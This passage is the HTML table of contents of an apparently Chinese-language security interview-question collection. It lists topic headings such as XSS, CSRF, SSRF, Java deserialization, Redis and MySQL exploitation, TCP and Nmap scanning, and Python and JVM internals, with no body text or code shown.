href="#%E5%86%99%E8%BF%87%E5%93%AA%E4%BA%9B%E6%AD%A3%E5%88%99%E5%8F%8A%E5%85%B7%E4%BD%93%E5%9C%BA%E6%99%AF"><span class="toc-number">1.10.</span> <span class="toc-text">写过哪些正则及具体场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%9F%A5%E8%B5%84%E6%96%99%E4%B8%8D%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9B%B4%E6%8E%A5%E5%86%99IPv4%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-number">1.11.</span> <span class="toc-text">不查资料不能测试直接写IPv4的正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E4%BC%9A%E5%AF%BC%E8%87%B4%E6%80%8E%E6%A0%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.12.</span> <span class="toc-text">Java反射机制会导致怎样的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%92%8CCSRF%E7%9A%84%E7%9B%B8%E5%90%8C%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%85%8D%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">1.13.</span> <span class="toc-text">XSS和CSRF的相同点以及如何配合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-TOKEN%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%81%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.</span> <span class="toc-text">CSRF_TOKEN的位置、原理和绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BD%E5%8F%AF%E8%83%BD%E5%A4%9A%E5%9C%B0%E8%AF%B4%E4%BD%A0%E6%89%80%E7%9F%A5%E9%81%93%E7%9A%84HTTP%E5%A4%B4"><span class="toc-number">1.15.</span> <span class="toc-text">尽可能多地说你所知道的HTTP头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E5%B8%B8%E8%A7%81%E6%89%AB%E6%8F%8F%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8ANSE%E8%84%9A%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.16.</span> <span class="toc-text">Nmap常见扫描方式的原理以及NSE脚本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.17.</span> <span class="toc-text">跨域的解决办法原理以及安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-CORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89"><span class="toc-number">1.17.1.</span> <span class="toc-text">1. CORS（跨域资源共享）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-JSONP%EF%BC%88JSON-with-Padding%EF%BC%89"><span class="toc-number">1.17.2.</span> <span class="toc-text">2. JSONP（JSON with Padding）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.17.3.</span> <span class="toc-text">3. Nginx反向代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9"><span class="toc-number">1.18.</span> <span class="toc-text">Python多进程和多线程如何选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="toc-number">1.18.1.</span> <span class="toc-text">1. 多线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%9A%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.18.2.</span> <span class="toc-text">2. 多进程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84GIL%E9%94%81%E6%9C%AC%E8%B4%A8%E4%B8%8A%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85"><span class="toc-number">1.19.</span> <span class="toc-text">Python的GIL锁本质上做了什么事情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84JVM%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%9C%89GCROOT"><span class="toc-number">1.20.</span> <span class="toc-text">Java的JVM为什么要有GCROOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84JVM%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8"><span class="toc-number">1.21.</span> <span class="toc-text">Java的JVM有哪些垃圾收集器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E8%AE%A1%E6%95%B0%E5%BC%95%E7%94%A8%E6%9C%BA%E5%88%B6%E7%9A%84%E7%BC%BA%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.22.</span> <span class="toc-text">垃圾回收计数引用机制的缺点是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E6%80%8E%E4%B9%88%E6%8B%BF%E5%88%B0-Cookie"><span class="toc-number">1.23.</span> <span class="toc-text">CSRF 怎么拿到 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%9F%9F%E5%90%8D%E6%80%8E%E6%A0%B7%E9%80%9A%E8%BF%87-CSRF-%E6%8B%BF-Cookie"><span class="toc-number">1.24.</span> <span class="toc-text">不同域名怎样通过 CSRF 拿 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Only-%E6%9C%AC%E8%B4%A8%E4%B8%8A%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85"><span class="toc-number">1.25.</span> <span class="toc-text">HTTP-Only 本质上做了什么事情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91"><span class="toc-number">1.26.</span> <span class="toc-text">平衡二叉树和二叉搜索树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-Flood-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.27.</span> <span class="toc-text">SYN Flood 攻击原理及解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-%E5%8F%8D%E5%90%91%E6%8E%A2%E6%B5%8B%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.28.</span> <span class="toc-text">SYN 反向探测的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-SYN-Cookie-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.29.</span> <span class="toc-text">TCP SYN Cookie 的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B%E7%9A%84%E6%9C%89%E6%95%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.30.</span> <span class="toc-text">UDP端口探测的有效方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E7%9A%84FIN%E6%89%AB%E6%8F%8F%E5%92%8C%E7%A9%BA%E6%89%AB%E6%8F%8F"><span class="toc-number">1.31.</span> <span class="toc-text">Nmap的FIN扫描和空扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E7%9A%84%E5%BA%8F%E5%88%97%E5%8F%B7%E5%8F%98%E5%8C%96"><span class="toc-number">1.32.</span> <span class="toc-text">三次握手的序列号变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.33.</span> <span class="toc-text">Python的值类型和引用类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84list%E5%92%8Cdict%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%90%97"><span class="toc-number">1.34.</span> <span class="toc-text">Python的list和dict线程安全吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%AE%9E%E9%99%85%E7%9A%84%E4%BE%8B%E5%AD%90%E8%AF%B4%E8%AF%B4SSRF"><span class="toc-number">1.35.</span> <span class="toc-text">结合实际的例子说说SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%AE%9E%E9%99%85%E7%9A%84%E4%BE%8B%E5%AD%90%E8%AE%B2%E8%AE%B2RCE"><span class="toc-number">1.36.</span> <span class="toc-text">结合实际的例子讲讲RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%8E%B0%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%BE%88%E5%B0%91%E4%BA%86"><span class="toc-number">1.37.</span> <span class="toc-text">为什么现在文件上传很少了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E7%9A%84WAF%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">1.38.</span> <span class="toc-text">基于语义分析的WAF了解吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84Class%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.39.</span> <span class="toc-text">Java的Class文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1XSS%E7%9A%84"><span class="toc-number">1.40.</span> <span class="toc-text">CSP是如何防御XSS的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%85%BE%E8%AE%AF"><span class="toc-number">2.</span> <span class="toc-text">腾讯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BC%81%E4%B8%9A%E6%9C%89HIDS%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%80%8E%E4%B9%88%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">1. 企业有HIDS的情况下怎么攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BC%81%E4%B8%9A%E8%A6%81%E6%80%8E%E4%B9%88%E5%81%9A%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">2.2.</span> <span class="toc-text">2. 企业要怎么做敏感数据泄露的防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%81%8AHW%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87%E6%88%96%E6%8A%80%E5%B7%A7%E6%80%A7%E5%BC%BA%E7%9A%84%E7%BB%8F%E5%8E%86"><span class="toc-number">2.3.</span> <span class="toc-text">3. 聊HW中的绕过或技巧性强的经历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%85%A2%E5%90%AF%E5%8A%A8"><span class="toc-number">2.4.</span> <span class="toc-text">4. TCP拥塞控制和慢启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E6%80%8E%E4%B9%88%E6%94%B6%E9%9B%86%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">5. 谷歌语法：怎么收集子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84"><span class="toc-number">2.6.</span> <span class="toc-text">6. 谷歌语法：识别指纹的时候，如何搜索路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E7%9A%84%E6%8C%87%E7%BA%B9"><span class="toc-number">2.7.</span> <span class="toc-text">7. 谷歌语法：如何搜索前端源码的指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%80%8E%E4%B9%88%E9%80%9A%E8%BF%87IP%E5%8F%8D%E6%9F%A5%E5%9F%9F%E5%90%8D"><span class="toc-number">2.8.</span> <span class="toc-text">8. 怎么通过IP反查域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%AD%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%94%B6%E9%9B%86%E6%89%8B%E6%AE%B5"><span class="toc-number">2.9.</span> <span class="toc-text">9. 信息收集中子域名的收集手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1"><span class="toc-number">2.10.</span> <span class="toc-text">CSRF 防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.11.</span> <span class="toc-text">XXE 无回显探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">2.12.</span> <span class="toc-text">XSS 硬编码利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.13.</span> <span class="toc-text">CSRF 防御代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8E%A2%E6%B5%8B%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.14.</span> <span class="toc-text">XXE 无回显探测代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.15.</span> <span class="toc-text">XSS 硬编码利用代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E8%BD%AC%E4%B9%89%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.16.</span> <span class="toc-text">XSS 转义特殊编码执行代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">2.17.</span> <span class="toc-text">1. Linux程序的内存布局</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">2.17.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-data%E6%AE%B5%E5%92%8C-bss%E6%AE%B5%E5%AD%98%E6%94%BE%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.18.</span> <span class="toc-text">2. .data段和.bss段存放的数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-1"><span class="toc-number">2.18.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E6%B5%81%E7%A8%8B%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">2.19.</span> <span class="toc-text">3. 函数调用时的流程、参数传递、寄存器和栈的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-2"><span class="toc-number">2.19.1.</span> <span class="toc-text">示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%EF%BC%88x86-64%EF%BC%89%EF%BC%9A"><span class="toc-number">2.19.2.</span> <span class="toc-text">汇编代码（x86_64）：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5"><span class="toc-number">2.20.</span> <span class="toc-text">4. 程序的编译和链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">2.20.1.</span> <span class="toc-text">编译过程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-3"><span class="toc-number">2.20.2.</span> <span class="toc-text">示例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">2.20.3.</span> <span class="toc-text">编译和链接命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.20.4.</span> <span class="toc-text">编译原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#If-Else%E8%AF%AD%E6%B3%95%E6%A0%91%EF%BC%9A"><span class="toc-number">2.20.5.</span> <span class="toc-text">If&#x2F;Else语法树：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Linux-proc%E7%9B%AE%E5%BD%95%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.21.</span> <span class="toc-text">5. Linux &#x2F;proc目录和查看进程打开的文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E6%89%93%E5%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">2.21.1.</span> <span class="toc-text">查看进程打开的文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-4"><span class="toc-number">2.21.2.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SGD%E5%92%8CAdam%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.22.</span> <span class="toc-text">6. SGD和Adam的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SGD%EF%BC%88%E9%9A%8F%E6%9C%BA%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.1.</span> <span class="toc-text">SGD（随机梯度下降）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adam%EF%BC%88Adaptive-Moment-Estimation%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.2.</span> <span class="toc-text">Adam（Adaptive Moment Estimation）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%88PyTorch%EF%BC%89%EF%BC%9A"><span class="toc-number">2.22.3.</span> <span class="toc-text">示例代码（PyTorch）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adam%E6%9B%B4%E6%96%B0%E8%A7%84%E5%88%99%EF%BC%9A"><span class="toc-number">2.22.4.</span> <span class="toc-text">Adam更新规则：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E5%92%8C%E5%B7%A5%E5%85%B7"><span class="toc-number">2.23.</span> <span class="toc-text">Java反序列化原理和工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">2.24.</span> <span class="toc-text">Shiro反序列化工具的原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%91%98"><span class="toc-number">3.</span> <span class="toc-text">安全研究员</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">SSRF的绕过和防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.1.</span> <span class="toc-text">SSRF绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E9%98%B2%E5%BE%A1"><span class="toc-number">3.1.2.</span> <span class="toc-text">SSRF防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%92%8CJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">Fastjson和Jackson反序列化原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastjson"><span class="toc-number">3.2.1.</span> <span class="toc-text">Fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jackson"><span class="toc-number">3.2.2.</span> <span class="toc-text">Jackson</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%85%B6%E4%BB%96%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%90%97"><span class="toc-number">3.3.</span> <span class="toc-text">BCEL可以用其他类加载器吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.4.</span> <span class="toc-text">XStream反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">RMI原理以及相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%E5%8E%9F%E7%90%86"><span class="toc-number">3.5.1.</span> <span class="toc-text">RMI原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.2.</span> <span class="toc-text">RMI漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">JdbcRowSetImpl如何触发JNDI注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80"><span class="toc-number">4.</span> <span class="toc-text">长亭科技</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">MySQL 报错注入常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-WAF"><span class="toc-number">4.2.</span> <span class="toc-text">报错注入绕过 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.3.</span> <span class="toc-text">MySQL 写文件的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">MySQL 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E9%99%A4%E4%BA%86-SQL-%E6%B3%A8%E5%85%A5%E5%A4%96%E7%9A%84%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F"><span class="toc-number">4.5.</span> <span class="toc-text">SQL Server 除了 SQL 注入外的渗透方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">Redis 主从复制漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%A6%82%E4%BD%95%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">4.7.</span> <span class="toc-text">Redis 未授权访问如何获得服务器权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E4%B8%80%E8%88%AC%E8%AF%BB%E5%8F%96%E4%BB%80%E4%B9%88%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">4.8.</span> <span class="toc-text">任意文件读取，一般读取什么类型的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%8E%B7%E5%8F%96%E5%88%B0-Web-%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">4.9.</span> <span class="toc-text">如何通过文件读取获取到 Web 的绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">4.10.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd 文件内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.10.1.</span> <span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.11.</span> <span class="toc-text">正向代理和反向代理的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E6%98%AF%E5%90%A6%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="toc-number">4.12.</span> <span class="toc-text">Python 是否是真正的多线程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 